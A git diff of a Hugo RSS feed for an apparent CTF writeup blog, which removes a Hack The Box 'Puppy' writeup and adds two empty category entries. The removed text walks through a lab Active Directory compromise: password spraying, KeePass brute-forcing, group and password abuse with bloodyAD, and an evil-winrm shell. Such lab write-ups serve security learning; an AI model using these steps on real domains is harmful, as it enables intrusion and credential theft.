@@ -1,113 +1,33 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
-        <title>Posts on Enigma Writeups</title>
-        <link>https://enigma522.online/posts/</link>
-        <description>Recent content in Posts on Enigma Writeups</description>
+        <title>All Writeups on Enigma Writeups</title>
+        <link>//localhost:1313/posts/</link>
+        <description>Recent content in All Writeups on Enigma Writeups</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
         <copyright>      Made with 🧠 and ☕ by Enigma | &lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;
     </copyright>
-        <lastBuildDate>Thu, 10 Jul 2025 00:00:00 +0000</lastBuildDate>
-        <atom:link href="https://enigma522.online/posts/index.xml" rel="self" type="application/rss+xml" />
+        <lastBuildDate>Mon, 14 Jul 2025 00:00:00 +0000</lastBuildDate>
+        <atom:link href="//localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
         
         <item>
-            <title>🐶 Puppy – HTB Writeup</title>
-            <link>https://enigma522.online/posts/ctf-writeup/</link>
+            <title>CTFs</title>
+            <link>//localhost:1313/posts/ctf/</link>
+            <pubDate>Mon, 14 Jul 2025 00:00:00 +0000</pubDate>
+            
+            <guid>//localhost:1313/posts/ctf/</guid>
+            <description></description>
+            <content type="html"><![CDATA[]]></content>
+        </item>
+        
+        <item>
+            <title>HTB machines</title>
+            <link>//localhost:1313/posts/htb/</link>
             <pubDate>Thu, 10 Jul 2025 00:00:00 +0000</pubDate>
             
-            <guid>https://enigma522.online/posts/ctf-writeup/</guid>
-            <description>Start credentials:
-levi.james : KingofAkron2025!
-🔍 Recon - Nmap Scan We begin with an Nmap scan:
-nmap -sC -sV -Pn 10.10.11.70 PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 111/tcp open rpcbind 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 2049/tcp open nfs 3260/tcp open iscsi 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman This is clearly an Active Directory environment.</description>
-            <content type="html"><![CDATA[<p><img src="../../images/puppy/Puppy.png"></p>
-<p><strong>Start credentials:</strong><br>
-<code>levi.james : KingofAkron2025!</code></p>
-<hr>
-<h2 id="-recon---nmap-scan">🔍 Recon - Nmap Scan</h2>
-<p>We begin with an Nmap scan:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sC -sV -Pn 10.10.11.70
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>PORT     STATE SERVICE
-</span></span><span style="display:flex;"><span>53/tcp   open  domain
-</span></span><span style="display:flex;"><span>88/tcp   open  kerberos-sec
-</span></span><span style="display:flex;"><span>111/tcp  open  rpcbind
-</span></span><span style="display:flex;"><span>135/tcp  open  msrpc
-</span></span><span style="display:flex;"><span>139/tcp  open  netbios-ssn
-</span></span><span style="display:flex;"><span>389/tcp  open  ldap
-</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds
-</span></span><span style="display:flex;"><span>464/tcp  open  kpasswd5
-</span></span><span style="display:flex;"><span>593/tcp  open  http-rpc-epmap
-</span></span><span style="display:flex;"><span>636/tcp  open  ldapssl
-</span></span><span style="display:flex;"><span>2049/tcp open  nfs
-</span></span><span style="display:flex;"><span>3260/tcp open  iscsi
-</span></span><span style="display:flex;"><span>3268/tcp open  globalcatLDAP
-</span></span><span style="display:flex;"><span>3269/tcp open  globalcatLDAPssl
-</span></span><span style="display:flex;"><span>5985/tcp open  wsman
-</span></span></code></pre></div><p>This is clearly an <strong>Active Directory environment</strong>.</p>
-<hr>
-<h2 id="smb--enumeration">SMB &amp; Enumeration</h2>
-<p>Using <code>netexec</code> for SMB enumeration:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb 10.10.11.70 -u levi.james -p <span style="color:#e6db74">&#39;KingofAkron2025!&#39;</span>
-</span></span></code></pre></div><p><img src="../../images/puppy/image1.png"></p>
-<p><img src="../../images/puppy/image.png"></p>
-<p>We <strong>don’t have access</strong> to the <code>DEV</code> share,<br>
-so our first objective is to <strong>gain access</strong> and be able to browse its contents.</p>
-<hr>
-<h2 id="bloodhound-analysis">BloodHound Analysis</h2>
-<p>We load data into BloodHound and discover that we have <strong>GenericWrite</strong> permission over the <code>DEVELOPERS</code> group.</p>
-<p><img src="../../images/puppy/image2.png"></p>
-<p>So the idea here is to <strong>add our current user</strong> to the <code>DEVELOPERS</code> group in order to gain access to the share.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bloodyAD --host <span style="color:#e6db74">&#39;10.10.11.70&#39;</span> -d <span style="color:#e6db74">&#39;dc01.puppy.htb&#39;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -u <span style="color:#e6db74">&#39;levi.james&#39;</span> -p <span style="color:#e6db74">&#39;KingofAkron2025!&#39;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  add groupMember <span style="color:#e6db74">&#39;DEVELOPERS&#39;</span> levi.james
-</span></span></code></pre></div><p>✅ We now have access to the <code>DEV</code> share.</p>
-<p><img src="../../images/puppy/image3.png"></p>
-<hr>
-<h2 id="keepass-brute-force">Keepass Brute-Force</h2>
-<p>From the share, we retrieve a file: <code>recovery.kdbx</code>.<br>
-To brute-force it, we use:</p>
-<blockquote>
-<p><a href="https://github.com/r3nt0n/keepass4brute">https://github.com/r3nt0n/keepass4brute</a></p>
-</blockquote>
-<p><img src="../../images/puppy/image12.png"></p>
-<p>Then we can open the file with keepass</p>
-<p><img src="../../images/puppy/image4.png"></p>
-<p>After cracking the DB, we extract usernames and passwords into <code>user.txt</code> and <code>pass.txt</code>, then spray:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netexec smb 10.10.11.70 -u user.txt -p pass.txt
-</span></span></code></pre></div><p><img src="../../images/puppy/image5.png"></p>
-<p>Success! We get:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>ant.edwards : Antman2025!
-</span></span></code></pre></div><hr>
-<h2 id="bloodhound---round-2">BloodHound - Round 2</h2>
-<p>Now, let’s return to BloodHound to see what this new user can do. We find that ant.edwards has GenericAll permissions on ADAM.SILVER, who is a member of the Remote Management Users group.</p>
-<p><img src="../../images/puppy/image6.png"></p>
-<p><img src="../../images/puppy/image7.png"></p>
-<hr>
-<h2 id="resetting-adamsilvers-password">Resetting ADAM.SILVER’s Password</h2>
-<p>The idea here is to leverage the GenericAll permission to forcibly reset ADAM.SILVER’s password using BloodyAD:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bloodyAD --host <span style="color:#e6db74">&#39;10.10.11.70&#39;</span> -d <span style="color:#e6db74">&#39;puppy.htb&#39;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -u <span style="color:#e6db74">&#39;ant.edwards&#39;</span> -p <span style="color:#e6db74">&#39;Antman2025!&#39;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  set password ADAM.SILVER <span style="color:#e6db74">&#39;N3wP@ssw0rd&#39;</span>
-</span></span></code></pre></div><p>However, the account is disabled.</p>
-<p><img src="../../images/puppy/image8.png"></p>
-<hr>
-<h2 id="enabling-the-user-account">Enabling the User Account</h2>
-<p>We prepare an .ldif file to re-enable the disabled ADAM.SILVER account by modifying its userAccountControl attribute. The value 512 sets the account to enabled and normal.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dn: CN<span style="color:#f92672">=</span>Adam D. Silver,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>puppy,DC<span style="color:#f92672">=</span>htb
-</span></span><span style="display:flex;"><span>changetype: modify
-</span></span><span style="display:flex;"><span>replace: userAccountControl
-</span></span><span style="display:flex;"><span>userAccountControl: <span style="color:#ae81ff">512</span>
-</span></span></code></pre></div><p>To apply this change, we use the <strong>ldapmodify</strong> tool, which allows us to send LDAP modification requests to the Active Directory server</p>
-<p><img src="../../images/puppy/image9.png"></p>
-<hr>
-<h2 id="access-with-evil-winrm">Access with Evil-WinRM</h2>
-<p>Now that the account is active, we can use Evil-WinRM:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i 10.10.11.70 -u <span style="color:#e6db74">&#39;adam.silver&#39;</span> -p <span style="color:#e6db74">&#39;N3wP@ssw0rd&#39;</span> -d <span style="color:#e6db74">&#39;puppy.htb&#39;</span>
-</span></span></code></pre></div><p><img alt="s" src="../../images/puppy/image10.png"></p>
-<hr>
-<p>🏁 <strong>User flag acquired! GG.</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>type C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\a</span>dam.silver<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\u</span>ser.txt
-</span></span></code></pre></div>]]></content>
+            <guid>//localhost:1313/posts/htb/</guid>
+            <description></description>
+            <content type="html"><![CDATA[]]></content>
         </item>
         
     </channel>
